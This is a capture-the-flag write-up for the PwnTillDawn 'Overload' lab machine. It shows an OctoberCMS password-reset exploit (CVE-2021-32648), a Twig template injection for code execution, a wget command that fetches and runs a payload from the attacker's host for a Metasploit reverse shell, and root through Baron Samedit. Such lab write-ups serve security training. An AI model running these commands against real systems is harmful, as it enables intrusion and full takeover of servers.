---
layout: post
title: PwnTillDawn - Overload Writeup
date: 2025-03-20
classes: wide
description: Enumerating LDAP to identify users, enumerating virtual hosts and exploring multiple CMSs for vulnerabilities to get an initial shell and escalating privileges through Baron Samedit (CVE-2021-3156).
---

## Overload (10.150.150.17)

![1](/assets/img/post/pwntilldawn_overload/1.png)



## Initial Scanning

Let's scan the target for services available and potential entry points:

![2](/assets/img/post/pwntilldawn_overload/2.png)

The scan has returned several ports, but the versions of Apache, Bind, FTP and SSH don't really point to any useful public CVEs apart from DoS, though we can abuse SMTP to enumerate usernames available inside the machine.

![3](/assets/img/post/pwntilldawn_overload/3.png)

Additionally, we also have LDAP avaialable, which is a lighter version of Active Directory and a MySQL listener.



## A Wild Subdomain Appears

After spending some time with LDAP, I've realized it was a lure, and that's all, so I've went after the web server, which has only one information:

<img src="/assets/img/post/pwntilldawn_overload/4.png" alt="4" style="zoom:50%;" />

Assuming *ptd* stands for PwnTillDawn, this must be a hostname, so I've added it to `/etc/hosts` and tested out for subdomains using DNS queries with `dig`:

```
dig any @10.150.150.17 overload.ptd
```

![5](/assets/img/post/pwntilldawn_overload/5.png)

Interestingly, we have an email subdomain, but once added to the `hosts` file, it's the same exact page, no additional information is provided and enumerating the subdomain has almost proved itself useless.

![6](/assets/img/post/pwntilldawn_overload/6.png)

So you might be thinking: *"What about the PHPMyAdmin?"*. Yes, it draws attention, but since I don't have any user apart from root and the version doesn't have any useful CVEs, all we can do is brute force the account and hope for the best.



## Oh, "Overload" eh?

Using the recently found hostname, what we can do is try to enumerate available vhosts within the server.

```
ffuf -u http://overload.ptd -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.overload.ptd" -fw 1
```

![7](/assets/img/post/pwntilldawn_overload/7.png)

As the vhosts keeps popping up, I've thought it was a fake, until I've realized they're not. Still wondering why is this called *Overload*? 

![8](/assets/img/post/pwntilldawn_overload/8.png)

Each and every virtual host has a functional CMS installed on it. Have fun enumerating and researching all 7 of them. Once added to the `/etc/hosts` I've decided to test all CMSs in the same order FFuF found them, which took me to `cms.overload.ptd`. 

![9](/assets/img/post/pwntilldawn_overload/9.png)

The page title says "OctoberCMS", so after a quick google search I've found out you can access administrator login page by appending `/backend` at the end of the URL.

![10](/assets/img/post/pwntilldawn_overload/10.png)

I've decided to look for public CVEs based on year instead of version, since I couldn't find a version string. I've used 2020 as reference since the scans showed this year.

![12](/assets/img/post/pwntilldawn_overload/12.png)

The CVE-2021-32648 can be used to reset a user's password and all you need is a username.



## Autumn Leaves, Admin Falls

If you don't have a valid username so far, you can either try guessing, enumerate using `smtp-enum` with Hydra or create a personal wordlist based on common words you can see throughout the CTF: `fritz`, `admin`,`overload`.

```
hydra -L users.txt smtp-enum://10.150.150.17/vrfy
```

![11](/assets/img/post/pwntilldawn_overload/11.png)

With a valid username in hands, all we need is the exploit, which can be found on [Github](https://github.com/Immersive-Labs-Sec/CVE-2021-32648) easily but requires some customizations. Since the original code is meant to be used on admin, there is no option to change the username, so either we add the option or modify the hardcoded user. If you choose the second option, all you gotta do is change the username on line 57 from `admin` to `overload`:

```python
    post_data = {
        '_token': csrf_token,
        'postback': 1,
        'login': 'overload' # 
    }
```

Now run the exploit and profit:

```sh
python cve-2021-32648.py --target "http://cms.overload.ptd" --password "S3cr37!"
```

![13](/assets/img/post/pwntilldawn_overload/13.png)



## From Template to Shell

Once accessed, we can view the user's dashboard:

![14](/assets/img/post/pwntilldawn_overload/14.png)

Now, after some exploration I haven't found anything useful, but I've discovered October actually uses Twig to build templates for the pages. So after googling about it, I've found an article about [RCE through Twig in October](https://cyllective.com/blog/posts/cve-2021-32649-octobercms).

So basically, to achieve a shell, all we need to do is to create a new page, name it whatever and add the following lines of code:

```twig
<pre>
    {{  this.controller.getTwig().registerUndefinedFilterCallback("passthru")  }}
    {{  this.controller.getTwig().getFilter("PAYLOAD")  }}
</pre>
```

I've decided to generate a payload with `msfvenom`, serve it using Python and run it on the target with the following command:

```sh
wget -O /tmp/shell http://10.66.66.158/shell && chmod +x /tmp/shell && /tmp/shell
```

So it'll download the file and save it in `/tmp/shell`, give it permissions with `chmod` and run it. This should return a connetion back to Metasploit:

```sh
msfconsole -x "use multi/handler;set lhost tun0;set lport 4444;run -j"
```

![15](/assets/img/post/pwntilldawn_overload/15.png)

With this shell, we can now find the `FLAG1.txt` file inside `/home/overload`:

![16](/assets/img/post/pwntilldawn_overload/16.png)



## Sudo Baron Strikes Again

I have used the same CVE for multiple machines during this series, and once more I'm abusing Baron Samedit (CVE-2021-3156). You can easily find a recommendation to do so by using the well-known [PEASS-ng](https://github.com/peass-ng/PEASS-ng) which I personally like to use in order to get some quick wins:

![17](/assets/img/post/pwntilldawn_overload/17.png)

Since I'm already using Metasploit, I can use the module present inside the framework to exploit the vulnerability:

```
www-data@overload:/home/overload$ ^Z # Ctrl + Z
Background channel 1? [y/N]  y
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/linux/local/sudo_baron_samedit
```

After setting up the required fields (`LHOST`, `LPORT`, `SESSION`) I ran the exploit:

![18](/assets/img/post/pwntilldawn_overload/18.png)

I really love seeing this session message popping up tbh. I can now get a shell and find the next flag inside root's home directory:

![19](/assets/img/post/pwntilldawn_overload/19.png)

This is the most extensive and challenging machine so far, it took me a **really long** time to realize which exploit I had to use since every exploit required an authenticated user. At the end the exploit was hidden because I've decided to filter for 2020's exploits, so the CVE from 2021 didin't showed up, making me run in circles wasting time with the other CMSes. Now I do understand the meaning of Overload, still it's an extremely fun challenge. 
